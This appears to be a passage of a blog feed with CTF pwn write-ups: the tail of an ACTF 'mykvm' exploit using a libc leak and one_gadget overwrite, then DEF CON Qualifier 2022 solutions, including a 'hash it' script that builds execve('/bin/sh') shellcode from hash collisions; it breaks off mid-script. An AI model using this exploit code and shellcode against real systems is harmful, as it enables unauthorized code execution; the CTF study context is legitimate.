keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span><span class="token comment"># findidx()</span><span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7198</span><span class="token operator">-</span><span class="token number">0x610000</span>info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x45226</span>info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"host name: "</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x1d</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>one_gadget<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token operator">&amp;</span><span class="token number">0xff0000</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://lwn.net/Articles/658511/">Using the KVM API</a></p><p><a href="https://elixir.bootlin.com/linux/v5.16-rc1/source/include/uapi/linux/kvm.h#L98">kvm.h - include&#x2F;uapi&#x2F;linux&#x2F;kvm.h - Linux source code (v5.16-rc1) - Bootlin</a></p><p><a href="https://www.jianshu.com/p/5ec4507e9be0">ã€KVMã€‘KVMå­¦ä¹ -å®ç°è‡ªå·±çš„å†…æ ¸</a></p><p>[<a href="https://david942j.blogspot.com/2018/10/note-learning-kvm-implement-your-own.html">Note] Learning KVM - implement your own kernel</a></p><p><a href="https://c9x.me/x86/html/file_module_x86_id_139.html">x86 Instruction Set Reference</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/28/mykvm/">ACTF 2022 Pwn mykvm</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON Qualifier 2022</title>
      <link href="/2022/05/31/def-con-qualifier-2022/"/>
      <url>/2022/05/31/def-con-qualifier-2022/</url>
      
        <content type="html"><![CDATA[<p>ã€Œé¢˜ç›®é“¾æ¥ã€ï¼š<a href="https://github.com/Nautilus-Institute/quals-2022">https://github.com/Nautilus-Institute/quals-2022</a></p><h1 id="MIC-check-1"><a href="#MIC-check-1" class="headerlink" title="MIC check 1"></a>MIC check 1</h1><p>ç­¾åˆ°é¢˜ï¼Œè®¡ç®—ç»™çš„æ•°å­¦é¢˜</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"simple-service-c45xrrmhuc5su.shellweplayaga.me"</span><span class="token punctuation">,</span><span class="token string">"31337"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Ticket please: "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"ticket&#123;FreeboardPort8285n22:i1wxz8BFiFl6thcsJPGNkqiNsIZTgKdeySpriUVC4gu0WnY4&#125;"</span><span class="token punctuation">)</span>answer <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"= "</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"*"</span> <span class="token operator">*</span><span class="token number">20</span><span class="token keyword">print</span> answerq <span class="token operator">=</span> answer<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" ="</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token keyword">print</span> aio<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220531092700900.png" alt="image-20220531092700900"></p><h1 id="hash-it"><a href="#hash-it" class="headerlink" title="hash it"></a>hash it</h1><p>è¾“å…¥çš„å†…å®¹åˆ†åˆ«è¢«md5,sha1,sha256,sha512å¤„ç†ï¼Œæ¯ä¸¤ä¸ªå­—èŠ‚å¤„ç†ä¸€æ¬¡ï¼Œå–å¤„ç†åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ‹¼æ¥å‡ºshellcodeæ‰§è¡Œã€‚æ€è·¯æ˜¯å“ˆå¸Œç¢°æ’å¯è§å­—ç¬¦ï¼Œæ‹¼æ¥å‡ºæ¥å³å¯ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> hashlibcontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'sp'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token comment"># shellcode = '\\x50\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\xb0\\x3b\\x0f\\x05'</span>table <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$%^&amp;*()_+-=;:\\'</span>"<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token operator">&lt;></span><span class="token operator">/</span>?`<span class="token operator">|</span>'char_table <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">]</span><span class="token comment"># shellcode = ['50','48','31','d2','48','bb','2f','62','69','6e','2f','2f','73','68','53','54','5f','b0','3b','0f','05']</span><span class="token comment"># shellcode = ['50', '50', '5E', '48', '31', 'D2', '48', 'BB', '2F', '62', '69', '6E', '2F', '2F', '73', '68', '53', '54', '5F', 'B0', '3B', '0F', '05']</span>shellcode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'50'</span><span class="token punctuation">,</span><span class="token string">'48'</span><span class="token punctuation">,</span><span class="token string">'31'</span><span class="token punctuation">,</span><span class="token string">'d2'</span><span class="token punctuation">,</span><span class="token string">'48'</span><span class="token punctuation">,</span><span class="token string">'31'</span><span class="token punctuation">,</span><span class="token string">'f6'</span><span class="token punctuation">,</span><span class="token string">'48'</span><span class="token punctuation">,</span><span class="token string">'bb'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'62'</span><span class="token punctuation">,</span><span class="token string">'69'</span><span class="token punctuation">,</span><span class="token string">'6e'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'73'</span><span class="token punctuation">,</span><span class="token string">'68'</span><span class="token punctuation">,</span><span class="token string">'53'</span><span class="token punctuation">,</span><span class="token string">'54'</span><span class="token punctuation">,</span><span class="token string">'5f'</span><span class="token punctuation">,</span><span class="token string">'b0'</span><span class="token punctuation">,</span><span class="token string">'3b'</span><span class="token punctuation">,</span><span class="token string">'0f'</span><span class="token punctuation">,</span><span class="token string">'05'</span><span class="token punctuation">]</span><span class="token comment"># RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjUTYfi9JH0t800T810T850T880T8A0T8B0T8C0T8G0T8H0T8I0T8J0T8N0T8O0T8P0T8Q0T8R0T8SRAPZ0t8E0t8F0t8LZRARZ0t8MZjZTYfi9FD0t810T86RAPZ0t820t840t85ZHpzbinzshUPHAgHGFUUUUHGBUUUUHGHnUUUZP</span><span class="token keyword">def</span> <span class="token function">init_table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    char_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        char_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> char_list    <span class="token keyword">return</span> char_list<span class="token comment"># init_table()</span><span class="token keyword">def</span> <span class="token function">md5_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span> <span class="token comment"># push rax</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">def</span> <span class="token function">sha1_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">def</span> <span class="token function">sha256_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">def</span> <span class="token function">sha512_hash_code</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash_code_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> char_table<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>char_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> char_table<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            res <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha512<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> byte<span class="token punctuation">:</span>                hash_code_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>    <span class="token keyword">return</span> hash_code_list<span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">""</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> md5_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha1_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha256_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    result <span class="token operator">+=</span> sha512_hash_code<span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># io = process("./pwn")</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'hash-it-0-m7tt7b7whagjw.shellweplayaga.me'</span><span class="token 